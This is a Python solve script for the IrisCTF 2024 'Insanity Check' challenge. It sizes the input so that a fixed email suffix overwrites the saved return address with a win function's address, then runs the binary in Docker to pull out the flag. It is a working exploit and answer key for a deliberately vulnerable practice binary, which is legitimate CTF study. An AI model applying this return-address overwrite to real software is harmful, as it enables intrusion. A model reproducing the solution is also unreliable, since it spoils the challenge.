#!/usr/bin/env python3
"""Replay IrisCTF 2024 Insanity Check as a local suffix-alignment proof.

This helper is for local or explicitly authorized CTF challenge artifacts. The
binary copies a user-controlled name into a stack message and then appends a
fixed welcome suffix. The custom linker places `win` at 0x6d6f632e, whose
little-endian bytes are `.com\\0\\0\\0\\0`; aligning the suffix email's `.com`
substring with saved RIP redirects execution to `win`.
"""

from __future__ import annotations

import argparse
import re
import shutil
import struct
import subprocess
import sys
from pathlib import Path


WIN_ADDRESS = 0x6D6F632E
MESSAGE_TO_RET_OFFSET = 0x98
PREFIX = b"Hi there, "
SUFFIX = (
    b"! Welcome to IrisCTF2024. If you have any questions you can contact us "
    b"at test@example.com\x00\x00\x00\x00"
)
MAX_FGETS_NAME = 63
FLAG_RE = re.compile(r"(?i)(?:irisctf|flag|ctf)\{[^{}\r\n]{3,300}\}")
PLACEHOLDER_MARKERS = ("TEST_FLAG", "FLAG_FOR_TESTING", "DUMMY", "PLACEHOLDER")


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


def compute_alignment() -> dict[str, int]:
    target = p64(WIN_ADDRESS)
    suffix_ret_offset = SUFFIX.find(target)
    if suffix_ret_offset < 0:
        raise RuntimeError(f"win address bytes {target!r} are not present in suffix")
    name_length = MESSAGE_TO_RET_OFFSET - len(PREFIX) - suffix_ret_offset
    if not 0 <= name_length <= MAX_FGETS_NAME:
        raise RuntimeError(f"computed name length {name_length} is outside fgets bounds")
    return {
        "name_length": name_length,
        "suffix_ret_offset": suffix_ret_offset,
        "message_to_ret_offset": MESSAGE_TO_RET_OFFSET,
    }


def build_payload() -> bytes:
    return b"A" * compute_alignment()["name_length"] + b"\n"


def extract_flags(text: str) -> list[str]:
    flags: list[str] = []
    for match in FLAG_RE.finditer(text):
        candidate = match.group(0)
        if any(marker in candidate.upper() for marker in PLACEHOLDER_MARKERS):
            continue
        if candidate not in flags:
            flags.append(candidate)
    return flags


def solve_challenge_dir(
    challenge_dir: Path,
    image: str = "debian:bookworm",
    timeout: float = 20.0,
    inner_timeout: float = 3.0,
) -> str:
    docker = shutil.which("docker")
    if not docker:
        raise RuntimeError("docker is required to replay the Linux challenge binary")
    binary = challenge_dir / "chal"
    flag_file = challenge_dir / "flag"
    if not binary.exists():
        raise FileNotFoundError(f"missing challenge binary: {binary}")
    if not flag_file.exists():
        raise FileNotFoundError(f"missing local flag file: {flag_file}")

    alignment = compute_alignment()
    command = [
        docker,
        "run",
        "--rm",
        "-i",
        "--platform",
        "linux/amd64",
        "-v",
        f"{binary}:/work/chal:ro",
        "-v",
        f"{flag_file}:/flag:ro",
        "-w",
        "/work",
        image,
        "timeout",
        "-s",
        "KILL",
        str(inner_timeout),
        "./chal",
    ]
    completed = subprocess.run(
        command,
        input=build_payload(),
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        timeout=timeout,
        check=False,
    )
    text = completed.stdout.decode("utf-8", errors="replace")
    flags = extract_flags(text)
    if not flags:
        raise RuntimeError(f"no non-placeholder flag found in transcript: {text[-400:]!r}")

    print("challenge: Insanity Check")
    print("artifact: binary chal")
    print(f"win_address: 0x{WIN_ADDRESS:x}")
    print(f"win_address_bytes: {p64(WIN_ADDRESS)!r}")
    print(f"name_length: {alignment['name_length']}")
    print(f"suffix_ret_offset: {alignment['suffix_ret_offset']}")
    print("method: align suffix email .com NUL bytes over saved RIP to reach the .flag win symbol")
    print(f"flag: {flags[0]}")
    return flags[0]


def main() -> int:
    parser = argparse.ArgumentParser(description="Replay IrisCTF Insanity Check from local CTF artifacts.")
    parser.add_argument("--challenge-dir", type=Path, required=True, help="directory containing chal and flag")
    parser.add_argument("--image", default="debian:bookworm", help="Linux container image used to run the ELF")
    parser.add_argument("--timeout", type=float, default=20.0)
    parser.add_argument("--inner-timeout", type=float, default=3.0, help="timeout inside the container for the hanging ELF")
    args = parser.parse_args()
    try:
        solve_challenge_dir(
            args.challenge_dir.resolve(),
            image=args.image,
            timeout=args.timeout,
            inner_timeout=args.inner_timeout,
        )
    except Exception as exc:
        print(f"[!] {exc}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
